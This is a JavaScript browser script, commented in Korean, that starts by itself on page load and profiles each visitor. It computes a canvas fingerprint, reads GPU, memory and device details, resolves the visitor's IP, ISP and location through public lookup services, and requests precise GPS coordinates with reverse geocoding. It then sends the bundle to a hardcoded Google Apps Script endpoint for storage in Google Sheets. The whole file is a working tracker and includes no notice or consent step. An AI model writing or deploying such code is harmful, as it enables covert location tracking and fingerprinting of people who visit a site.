// GPS Collector Script
// 방문자 위치 정보 수집 및 Google Sheets 저장

(function() {
  'use strict';

  const GPS_API_ENDPOINT = 'https://script.google.com/macros/s/AKfycbwqVIw38PX7giZzevABm6llVsAXtFdzZ3DiUX_-aaqa42D6FXc6fmxH3pkU8GGwmI9U/exec';

  // Canvas Fingerprint
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = 200; canvas.height = 50;
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, 100, 50);
      ctx.fillStyle = '#069';
      ctx.fillText('fingerprint', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('canvas', 4, 17);
      const dataURL = canvas.toDataURL();
      let hash = 0;
      for (let i = 0; i < dataURL.length; i++) {
        hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
        hash = hash & hash;
      }
      return Math.abs(hash).toString(16).toUpperCase().slice(0, 8);
    } catch (e) { return 'N/A'; }
  }

  // WebGL GPU info
  function getGPU() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return '';
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || '';
      return gl.getParameter(gl.RENDERER) || '';
    } catch (e) { return ''; }
  }

  // Device detection
  function getDeviceString() {
    try {
      const ua = navigator.userAgent;
      const w = screen.width;
      const h = screen.height;
      const ratio = window.devicePixelRatio || 1;
      const gpu = getGPU();
      const cores = navigator.hardwareConcurrency || 0;
      const mem = navigator.deviceMemory || 0;
      const fp = getCanvasFingerprint();

      let model = 'Unknown';

      if (/iPhone/.test(ua)) {
        const key = `${Math.min(w,h)}x${Math.max(w,h)}@${ratio}`;
        const iphones = {
          '402x874@3': 'iPhone 16 Pro', '440x956@3': 'iPhone 16 Pro Max',
          '393x852@3': 'iPhone 16/15/14 Pro', '430x932@3': 'iPhone 16/15/14 Pro Max',
          '390x844@3': 'iPhone 14/13/12', '428x926@3': 'iPhone 14/13/12 Plus',
          '375x812@3': 'iPhone X/XS/11Pro/12mini/13mini',
          '414x896@3': 'iPhone XS Max/11 Pro Max', '414x896@2': 'iPhone XR/11',
          '375x667@2': 'iPhone SE/6/7/8', '414x736@3': 'iPhone 6+/7+/8+',
          '320x568@2': 'iPhone 5/SE1'
        };
        model = iphones[key] || `iPhone (${w}x${h})`;
      }
      else if (/iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        const key = `${Math.min(w,h)}x${Math.max(w,h)}@${ratio}`;
        const ipads = {
          '1024x1366@2': 'iPad Pro 12.9"', '834x1194@2': 'iPad Pro 11"',
          '820x1180@2': 'iPad Air 4/5', '810x1080@2': 'iPad 9/10',
          '768x1024@2': 'iPad Air/mini', '744x1133@2': 'iPad mini 6'
        };
        model = ipads[key] || `iPad (${w}x${h})`;
      }
      else if (/Macintosh/.test(ua)) {
        const g = gpu.toLowerCase();
        if (g.includes('m3 max')) model = 'Mac M3 Max';
        else if (g.includes('m3 pro')) model = 'Mac M3 Pro';
        else if (g.includes('m3')) model = 'Mac M3';
        else if (g.includes('m2 max')) model = 'Mac M2 Max';
        else if (g.includes('m2 pro')) model = 'Mac M2 Pro';
        else if (g.includes('m2')) model = 'Mac M2';
        else if (g.includes('m1 max')) model = 'Mac M1 Max';
        else if (g.includes('m1 pro')) model = 'Mac M1 Pro';
        else if (g.includes('m1')) model = 'Mac M1';
        else model = 'Mac (Intel)';
      }
      else if (/Android/.test(ua)) {
        let match = ua.match(/;\s*([^;]+(?:SM-|Galaxy|Pixel|LG-|SAMSUNG|Xiaomi|Redmi|OPPO|vivo|OnePlus|Huawei|HONOR)[^;]*)\s*(?:Build|;|\))/i);
        if (!match) match = ua.match(/Android[^;]*;\s*([A-Za-z0-9\-_\s]+)\s*(?:Build|;|\))/);
        if (!match) match = ua.match(/;\s*([A-Za-z]{2,}[^;]{2,20})\s*Build/);
        if (match && match[1] && match[1].length > 1) {
          model = match[1].trim();
        } else {
          model = 'Android';
        }
      }
      else if (/Windows/.test(ua)) {
        model = 'Windows PC';
      }
      else if (/Linux/.test(ua)) {
        model = 'Linux';
      }

      const parts = [model, `${w}x${h}`];
      if (cores > 0) parts.push(`${cores}코어`);
      if (mem > 0) parts.push(`${mem}GB`);
      parts.push(`FP:${fp}`);

      return parts.join(' | ');
    } catch (e) {
      return 'Unknown Device';
    }
  }

  // OS 감지
  function getOS() {
    const ua = navigator.userAgent;
    if (/iPhone OS (\d+[_\d]*)/.test(ua)) return 'iOS ' + ua.match(/iPhone OS (\d+[_\d]*)/)[1].replace(/_/g, '.');
    if (/iPad/.test(ua) && /OS (\d+[_\d]*)/.test(ua)) return 'iPadOS ' + ua.match(/OS (\d+[_\d]*)/)[1].replace(/_/g, '.');
    if (/Android (\d+[.\d]*)/.test(ua)) return 'Android ' + ua.match(/Android (\d+[.\d]*)/)[1];
    if (/Mac OS X (\d+[_\d]*)/.test(ua)) return 'macOS ' + ua.match(/Mac OS X (\d+[_\d]*)/)[1].replace(/_/g, '.');
    if (/Windows NT (\d+\.\d+)/.test(ua)) {
      const v = ua.match(/Windows NT (\d+\.\d+)/)[1];
      return 'Windows ' + ({ '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' }[v] || v);
    }
    if (/CrOS/.test(ua)) return 'Chrome OS';
    if (/Linux/.test(ua)) return 'Linux';
    return 'Unknown';
  }

  // 브라우저 감지
  function getBrowser() {
    const ua = navigator.userAgent;
    if (/Instagram/.test(ua)) return 'Instagram';
    if (/FBAN|FBAV/.test(ua)) return 'Facebook';
    if (/KAKAOTALK/.test(ua)) return 'KakaoTalk';
    if (/Line\//.test(ua)) return 'LINE';
    if (/Twitter/.test(ua)) return 'Twitter';
    if (/Edg\/(\d+)/.test(ua)) return 'Edge ' + (ua.match(/Edg\/(\d+)/)?.[1] || '');
    if (/SamsungBrowser\/(\d+)/.test(ua)) return 'Samsung ' + (ua.match(/SamsungBrowser\/(\d+)/)?.[1] || '');
    if (/OPR\/(\d+)/.test(ua)) return 'Opera ' + (ua.match(/OPR\/(\d+)/)?.[1] || '');
    if (/Firefox\/(\d+)/.test(ua)) return 'Firefox ' + (ua.match(/Firefox\/(\d+)/)?.[1] || '');
    if (/Chrome\/(\d+)/.test(ua) && !/Chromium/.test(ua)) return 'Chrome ' + (ua.match(/Chrome\/(\d+)/)?.[1] || '');
    if (/Safari\//.test(ua) && !/Chrome/.test(ua)) return 'Safari ' + (ua.match(/Version\/(\d+)/)?.[1] || '');
    return 'Unknown';
  }

  // GPS 위치 가져오기
  function getGPSLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        () => resolve(null),
        { timeout: 10000, enableHighAccuracy: true }
      );
    });
  }

  // 좌표로 주소 가져오기 (역지오코딩)
  async function reverseGeocode(lat, lon) {
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=en`);
      const d = await res.json();
      return {
        city: d.address?.city || d.address?.town || d.address?.village || d.address?.county || '',
        region: d.address?.state || d.address?.province || '',
        country: d.address?.country || '',
        countryCode: d.address?.country_code?.toUpperCase() || '',
        postal: d.address?.postcode || ''
      };
    } catch (e) { return null; }
  }

  // 전체 위치 정보 (GPS 우선, IP 보조)
  async function getLocationInfo() {
    let ipFullData = null;
    try {
      const res = await fetch('https://ipwho.is/');
      const d = await res.json();
      if (d.success) {
        ipFullData = {
          ip: d.ip || '',
          country: d.country || '',
          countryCode: d.country_code || '',
          region: d.region || '',
          city: d.city || '',
          postal: d.postal || '',
          lat: d.latitude || '',
          lon: d.longitude || '',
          tz: d.timezone?.id || '',
          isp: d.connection?.isp || '',
          asn: d.connection?.asn ? `AS${d.connection.asn}` : ''
        };
      }
    } catch (e) {}

    if (!ipFullData) {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        if (!d.error) {
          ipFullData = {
            ip: d.ip || '',
            country: d.country_name || '',
            countryCode: d.country_code || '',
            region: d.region || '',
            city: d.city || '',
            postal: d.postal || '',
            lat: d.latitude || '',
            lon: d.longitude || '',
            tz: d.timezone || '',
            isp: d.org || '',
            asn: d.asn || ''
          };
        }
      } catch (e) {}
    }

    if (!ipFullData) ipFullData = {};

    const gps = await getGPSLocation();

    if (gps && gps.lat && gps.lon) {
      const geo = await reverseGeocode(gps.lat, gps.lon);
      return {
        ip: ipFullData.ip || '',
        country: geo?.country || ipFullData.country || '',
        countryCode: geo?.countryCode || ipFullData.countryCode || '',
        region: geo?.region || ipFullData.region || '',
        city: geo?.city || ipFullData.city || '',
        postal: geo?.postal || ipFullData.postal || '',
        lat: gps.lat,
        lon: gps.lon,
        tz: ipFullData.tz || '',
        isp: ipFullData.isp || '',
        asn: ipFullData.asn || '',
        source: 'GPS'
      };
    }

    return { ...ipFullData, source: 'IP' };
  }

  // 데이터 수집 및 전송
  async function collectAndSend() {
    try {
      const loc = await getLocationInfo();
      const device = getDeviceString();
      const os = getOS();
      const browser = getBrowser();
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      const langs = navigator.languages ? navigator.languages.join(', ') : navigator.language;

      // Country: "South Korea (KR)"
      const country = loc.country ? (loc.country + (loc.countryCode ? ` (${loc.countryCode})` : '')) : '';

      // City: "[GPS] Seongnam-si, Gyeonggi-do (13437) | 37.42,127.13"
      let city = loc.source === 'GPS' ? '[GPS] ' : '';
      if (loc.city) city += loc.city;
      if (loc.region && loc.region !== loc.city) city += (loc.city ? ', ' : '') + loc.region;
      if (loc.postal) city += ` (${loc.postal})`;
      if (loc.lat && loc.lon) city += ` | ${Number(loc.lat).toFixed(4)},${Number(loc.lon).toFixed(4)}`;

      // ISP: "LG Uplus (AS3786)"
      const isp = loc.isp ? (loc.isp + (loc.asn ? ` (${loc.asn})` : '')) : '';

      // Language: "ko-KR, en | Asia/Seoul"
      const language = langs + (tz ? ` | ${tz}` : '');

      const data = {
        ip: loc.ip || '',
        country: country,
        city: city,
        isp: isp,
        device: device,
        os: os,
        browser: browser,
        language: language
      };

      console.log('GPS Entry:', data);

      await fetch(GPS_API_ENDPOINT, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      console.log('GPS data sent to Google Sheets');
    } catch (err) {
      console.error('GPS collection failed:', err);
    }
  }

  // 페이지 로드 시 수집
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', collectAndSend);
  } else {
    collectAndSend();
  }
})();
